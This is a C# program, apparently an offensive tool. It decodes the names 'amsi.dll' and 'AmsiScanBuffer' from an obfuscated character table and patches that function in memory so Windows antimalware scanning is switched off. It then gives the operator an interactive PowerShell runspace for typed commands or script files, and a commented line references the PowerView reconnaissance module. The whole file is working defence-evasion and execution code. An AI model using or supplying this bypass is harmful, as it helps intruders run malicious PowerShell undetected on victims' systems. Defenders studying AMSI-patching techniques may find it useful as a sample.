using System;
using System.Collections.ObjectModel;
using System.Runtime.InteropServices;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.IO;

namespace CMLExecutor
{
    public class Executor
    {
        public static string AllChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890.{}[]#';/=-+_";

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        static int Fhtagn()
        {
            IntPtr Address = GetProcAddress(LoadLibrary(string.Join("", new char[]{
                AllChars.ToCharArray()[0],
                AllChars.ToCharArray()[12],
                AllChars.ToCharArray()[18],
                AllChars.ToCharArray()[8],
                AllChars.ToCharArray()[62],
                AllChars.ToCharArray()[3],
                AllChars.ToCharArray()[11],
                AllChars.ToCharArray()[11],
            })), string.Join("", new char[]{
                AllChars.ToCharArray()[26],
                AllChars.ToCharArray()[12],
                AllChars.ToCharArray()[18],
                AllChars.ToCharArray()[8],
                AllChars.ToCharArray()[44],
                AllChars.ToCharArray()[2],
                AllChars.ToCharArray()[0],
                AllChars.ToCharArray()[13],
                AllChars.ToCharArray()[27],
                AllChars.ToCharArray()[20],
                AllChars.ToCharArray()[5],
                AllChars.ToCharArray()[5],
                AllChars.ToCharArray()[4],
                AllChars.ToCharArray()[17]
            }));

            UIntPtr size = (UIntPtr)5;
            uint p = 0;

            VirtualProtect(Address, size, 0x40, out p);
            Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            Marshal.Copy(Patch, 0, Address, 6);
            VirtualProtect(Address, size, p, out _);
            return 0;
        }
        static void Main(string[] args)
        {
            Runspace run = RunspaceFactory.CreateRunspace();
            run.Open();

            Console.WriteLine(Fhtagn());

            PowerShell shell = PowerShell.Create();
            shell.Runspace = run;

            /*shell.AddCommand("Import-Module").AddArgument(@"C:\Program Files\PowerView.ps1");
            shell.Invoke();*/

            var running = true;

            while (running)
            {
                string cmd = Console.ReadLine();
                if (cmd != "exit")
                {
                    var command = cmd;
                    if (cmd.StartsWith("file:"))
                    {
                        command = File.ReadAllText(cmd.Replace("file:", ""));
                        Console.WriteLine(command);
                    }
                    try
                    {
                        shell.AddScript(command);
                        Collection<PSObject> output = shell.Invoke();
                        Console.WriteLine("Command Output ----- ");
                        foreach (PSObject o in output)
                        {
                            Console.WriteLine(o.ToString());
                        }

                        foreach (ErrorRecord err in shell.Streams.Error)
                        {
                            Console.Write("Error: " + err.ToString());
                        }
                        Console.WriteLine("Enter New Command: ");
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.StackTrace);
                    }
                }
                else
                {
                    running = false;
                }

            }
            run.Close();
        }
    }

}